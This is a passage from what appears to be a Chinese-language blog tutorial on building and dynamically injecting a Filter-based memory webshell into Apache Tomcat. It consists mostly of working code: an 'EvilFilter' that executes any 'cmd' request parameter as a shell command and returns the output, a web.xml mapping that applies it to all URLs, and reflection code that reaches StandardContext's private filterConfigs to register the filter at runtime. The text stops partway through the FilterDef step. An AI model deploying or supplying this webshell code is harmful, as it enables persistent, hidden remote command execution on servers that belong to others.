+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.annotation.WebFilter</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.annotation.WebServlet</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.http.HttpServletRequest</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.http.HttpServletResponse</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.IOException</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.InputStream</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.Scanner</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">EvilFilter</span><span style="color: #E06C75"> </span><span style="color: #C678DD">implements</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Filter</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> destroy</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{  </span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> doFilter</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">ServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">request</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">ServletResponse</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">response</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">FilterChain</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">chain</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{  </span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">HttpServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">req</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (HttpServletRequest) request;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">HttpServletResponse</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">resp</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (HttpServletResponse) response;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">req</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cmd&quot;</span><span style="color: #ABB2BF">) </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">) {  </span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">boolean</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">isLinux</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">osTyp</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getProperty</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;os.name&quot;</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (osTyp </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">osTyp</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toLowerCase</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">contains</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;win&quot;</span><span style="color: #ABB2BF">)) {  </span></span>
+<span class="line"><span style="color: #ABB2BF">                isLinux </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> }  </span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">cmds</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> isLinux </span><span style="color: #C678DD">?</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;sh&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;-c&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">req</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cmd&quot;</span><span style="color: #ABB2BF">)} </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;cmd.exe&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;/c&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">req</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cmd&quot;</span><span style="color: #ABB2BF">)};  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">InputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">in</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRuntime</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">exec</span><span style="color: #ABB2BF">(cmds).</span><span style="color: #61AFEF">getInputStream</span><span style="color: #ABB2BF">();  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Scanner</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">s</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Scanner</span><span style="color: #ABB2BF">(in).</span><span style="color: #61AFEF">useDelimiter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">A&quot;</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">output</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">s</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">hasNext</span><span style="color: #ABB2BF">() </span><span style="color: #C678DD">?</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">s</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">next</span><span style="color: #ABB2BF">() </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">resp</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(output);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">resp</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">flush</span><span style="color: #ABB2BF">();  </span></span>
+<span class="line"><span style="color: #ABB2BF"> }  </span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">chain</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doFilter</span><span style="color: #ABB2BF">(request, response);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> }</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> init</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">FilterConfig</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">config</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<p><code>web.xml</code>记得修改类名</p>
+<figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;?</span><span style="color: #E06C75">xml</span><span style="color: #D19A66"> version</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;1.0&quot;</span><span style="color: #D19A66"> encoding</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;UTF-8&quot;</span><span style="color: #ABB2BF">?&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">web-app</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">xmlns</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span>
+<span class="line"><span style="color: #ABB2BF">         </span><span style="color: #D19A66">xmlns:xsi</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span>
+<span class="line"><span style="color: #ABB2BF">         </span><span style="color: #D19A66">xsi:schemaLocation</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span>
+<span class="line"><span style="color: #ABB2BF">         </span><span style="color: #D19A66">version</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;4.0&quot;</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">filter</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">        &lt;</span><span style="color: #E06C75">filter-name</span><span style="color: #ABB2BF">&gt;filter&lt;/</span><span style="color: #E06C75">filter-name</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">        &lt;</span><span style="color: #E06C75">filter-class</span><span style="color: #ABB2BF">&gt;EvilFilter&lt;/</span><span style="color: #E06C75">filter-class</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;/</span><span style="color: #E06C75">filter</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">filter-mapping</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">        &lt;</span><span style="color: #E06C75">filter-name</span><span style="color: #ABB2BF">&gt;filter&lt;/</span><span style="color: #E06C75">filter-name</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">        &lt;</span><span style="color: #E06C75">url-pattern</span><span style="color: #ABB2BF">&gt;/*&lt;/</span><span style="color: #E06C75">url-pattern</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;/</span><span style="color: #E06C75">filter-mapping</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">web-app</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260406213539632.png" srcset="/img/loading.gif" lazyload alt="image-20260406213539561"></p>
+</li>
+</ul>
+<h2 id="动态放入"><a href="#动态放入" class="headerlink" title="动态放入"></a>动态放入</h2><ul>
+<li><p>其实就是在操作<code>Filter</code> ，但是我们在现实操作的时候需要<strong>动态</strong>的将该 Filter 给添加进去</p>
+<p>由前面<strong>Filter实例存储分析</strong>得知 <code>StandardContext</code> Filter实例存放在filterConfigs、filterDefs、filterConfigs这三个变量里面，将fifter添加到这三个变量中即可将内存马打入。那么如何获取到<code>StandardContext</code> 成为了问题的关键。（反射即可）流程图如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260406213804370.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+</li>
+<li><p>先使用反射获取<code>StandardContext</code></p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//找到包装在 Facade 里的 ApplicationContext 对象。</span></span>
+<span class="line"><span style="color: #E5C07B">ServletContext</span><span style="color: #E06C75"> servletContext </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getSession</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getServletContext</span><span style="color: #ABB2BF">();</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//第一层反射 (context 字段)：从 ApplicationContextFacade 里拿到了内部真实的 ApplicationContext。</span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> appctx </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">servletContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;context&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">appctx</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">ApplicationContext</span><span style="color: #E06C75"> applicationContext </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (ApplicationContext) </span><span style="color: #E5C07B">appctx</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(servletContext);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//第二层反射 (context 字段)：从 ApplicationContext 里拿到了 Tomcat 最核心的容器类 StandardContext。</span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//注意：ApplicationContext 是对 StandardContext 的进一步包装，提供了符合 Servlet 规范的接口</span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> stdctx </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">applicationContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;context&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">stdctx</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">StandardContext</span><span style="color: #E06C75"> standardContext </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (StandardContext) </span><span style="color: #E5C07B">stdctx</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(applicationContext);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//第三层反射：获取 StandardContext 中存储 Filter 运行实例的私有 Map</span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> FilterName </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;cmd_Filter&quot;</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> Configs </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">standardContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;filterConfigs&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">Configs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">   </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">// 拿到这个 Map 后，你就拥有了动态增删 Filter 实例的权限，可以添加自己的恶意Filter</span></span>
+<span class="line"><span style="color: #E06C75"> filterConfigs </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (Map) </span><span style="color: #E5C07B">Configs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(standardContext);</span></span></code></pre></div></div></figure>
+</li>
+<li><p>接着，定义一个 Filter</p>
+<p>作用：拦截所有经过它的请求，检查是否带有特定参数，如果有，就执行系统命令并将结果回显到网页上。</p>
+<p>（判断+命令执行+回显）</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Filter</span><span style="color: #E06C75"> filter </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Filter</span><span style="color: #E06C75">() {  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">                    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> init</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">FilterConfig</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">filterConfig</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Filter</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">                    }</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">                    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> doFilter</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">ServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">servletRequest</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">ServletResponse</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">servletResponse</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">FilterChain</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">filterChain</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{  </span></span>
+<span class="line"><span style="color: #ABB2BF">                        </span><span style="color: #E5C07B">HttpServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">req</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (HttpServletRequest) servletRequest;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">req</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cmd&quot;</span><span style="color: #ABB2BF">) </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">){  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">                            </span><span style="color: #E5C07B">InputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">in</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRuntime</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">exec</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">req</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cmd&quot;</span><span style="color: #ABB2BF">)).</span><span style="color: #61AFEF">getInputStream</span><span style="color: #ABB2BF">();  </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Scanner</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">s</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Scanner</span><span style="color: #ABB2BF">(in).</span><span style="color: #61AFEF">useDelimiter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">A&quot;</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">output</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">s</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">hasNext</span><span style="color: #ABB2BF">() </span><span style="color: #C678DD">?</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">s</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">next</span><span style="color: #ABB2BF">() </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">servletResponse</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(output);  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF">; }  </span></span>
+<span class="line"><span style="color: #ABB2BF">                        </span><span style="color: #E5C07B">filterChain</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doFilter</span><span style="color: #ABB2BF">(servletRequest,servletResponse);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> }</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">                    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> destroy</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">                    }</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">                }</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure>
+</li>
+<li><p>再设置 <code>FilterDef</code> 和 <code>FilterMaps</code></p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//反射获取 FilterDef，设置 filter 名等参数后，调用 addFilterDef 将 FilterDef 添加  </span></span>
